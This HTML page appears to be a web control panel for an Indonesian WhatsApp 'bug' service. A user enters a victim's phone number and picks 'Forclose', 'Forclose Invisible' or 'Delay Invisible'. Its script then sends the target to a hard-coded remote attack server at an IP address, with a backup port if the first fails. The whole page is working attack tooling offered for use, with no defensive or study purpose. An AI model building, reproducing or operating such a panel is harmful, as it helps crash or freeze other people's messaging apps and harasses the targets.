<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Evolution App</title>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', monospace;
      background-color: black;
      color: white;
      text-align: center;
    }
    .avatar {
      margin-top: 30px;
      width: 200px;
      height: 200px;
      border-radius: 50%;
      border: 4px solid #0af;
      object-fit: cover;
    }
    .section {
      margin-top: 20px;
      padding: 10px;
      border: 2px solid red;
      border-radius: 10px;
      margin-left: 20px;
      margin-right: 20px;
    }
    .row {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
    }
    select, input {
      padding: 8px;
      font-size: 16px;
      margin: 5px;
    }
    button {
      padding: 12px 20px;
      font-size: 18px;
      margin: 5px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
    }
    button:hover {
      background-color: darkred;
    }
    button:active {
      transform: scale(0.92);
      box-shadow: 0 2px 6px rgba(255, 0, 0, 0.7);
    }
    .status {
      margin-top: 10px;
      font-size: 16px;
    }
    #toast {
      visibility: hidden;
      min-width: 250px;
      margin-left: -125px;
      background-color: #333;
      color: #fff;
      text-align: center;
      border-radius: 10px;
      padding: 16px;
      position: fixed;
      z-index: 1;
      left: 50%;
      bottom: 30px;
      font-size: 17px;
      box-shadow: 0 0 20px #ff0000;
    }
    #toast.show {
      visibility: visible;
      animation: fadein 0.5s, fadeout 0.5s 2.5s;
    }
    @keyframes fadein {
      from {bottom: 0; opacity: 0;}
      to {bottom: 30px; opacity: 1;}
    }
    @keyframes fadeout {
      from {bottom: 30px; opacity: 1;}
      to {bottom: 0; opacity: 0;}
    }
  </style>
</head>
<body>
  <img src="https://files.catbox.moe/7bncwn.jpg" alt="Evolution Avatar" class="avatar" />
  <h2>Wellcome to Evolution Web Version</h2>
  <p>Website ini dibuat oleh Shenzu, dan Web ini bekerja menggunakan bug via API jadi anda tidak perlu menyiapkan nomor sender lagi.</p>

  <div class="section">
    <label>Menu Bug →</label>
    <select id="bugType">
      <option value="fcinvis">Forclose Invisible</option>
      <option value="fc">Forclose</option>
      <option value="delayinvis">Delay Invisible</option>
    </select>
  </div>

  <div class="section row">
    <input type="text" id="targetNumber" placeholder="Masukkan Nomor Target" />
    <button onclick="kirimBug()" id="kirimBtn">Kirim</button>
  </div>

  <div class="status">
    Status Apl: <span id="statusText">Checking...</span>
  </div>

  <button onclick="logout()">LOGOUT</button>

  <div id="toast"></div>

  <script>
    function showToast(message, color = '#0f0') {
      const toast = document.getElementById('toast');
      toast.style.backgroundColor = color;
      toast.innerText = message;
      toast.className = 'show';
      setTimeout(() => { toast.className = toast.className.replace('show', ''); }, 3000);
    }

    function updateStatus() {
      fetch('http://46.101.32.52:2005/status')
        .then(response => response.json())
        .then(data => {
          document.getElementById('statusText').textContent = data.connected ? 'Connected' : 'Disconnected';
          document.getElementById('statusText').style.color = data.connected ? 'lime' : 'red';
        })
        .catch(() => {
          document.getElementById('statusText').textContent = 'Disconnected';
          document.getElementById('statusText').style.color = 'red';
        });
    }

    setInterval(updateStatus, 3000);
    updateStatus();

    let cooldownTime = 10 * 60 * 1000; // 10 minutes
    let lastSentTime = 0;

    function kirimBug() {
      const now = Date.now();
      if (now - lastSentTime < cooldownTime) {
        const remaining = Math.ceil((cooldownTime - (now - lastSentTime)) / 1000);
        showToast(`⏳ Tunggu ${remaining} detik sebelum mengirim lagi.`, '#ffa500');
        return;
      }

      const target = document.getElementById('targetNumber').value.trim();
      const type = document.getElementById('bugType').value;
      if (!target) {
        showToast('❗ Masukkan nomor target!', '#f00');
        return;
      }

      const primaryUrl = `http://46.101.32.52:2005/ptevolution?type=${type}&chatId=${target}@s.whatsapp.net`;
      const backupUrl = `http://46.101.32.52:2001/ptevolution?type=${type}&chatId=${target}@s.whatsapp.net`;

      fetch(primaryUrl)
        .then(res => {
          if (!res.ok) throw new Error('Primary API failed');
          return res.text();
        })
        .then(() => {
          lastSentTime = Date.now();
          showToast(`✅ Bug ${type} berhasil dikirim ke ${target}`);
        })
        .catch(() => {
          // Try backup API
          fetch(backupUrl)
            .then(res => {
              if (!res.ok) throw new Error('Backup API failed');
              return res.text();
            })
            .then(() => {
              lastSentTime = Date.now();
              showToast(`✅ Bug ${type} (backup) berhasil dikirim ke ${target}`, '#0af');
            })
            .catch(() => showToast('❌ Gagal mengirim bug (semua API error)', '#f00'));
        });
    }

    function logout() {
      window.location.href = 'index.html';
    }
  </script>
</body>
</html>
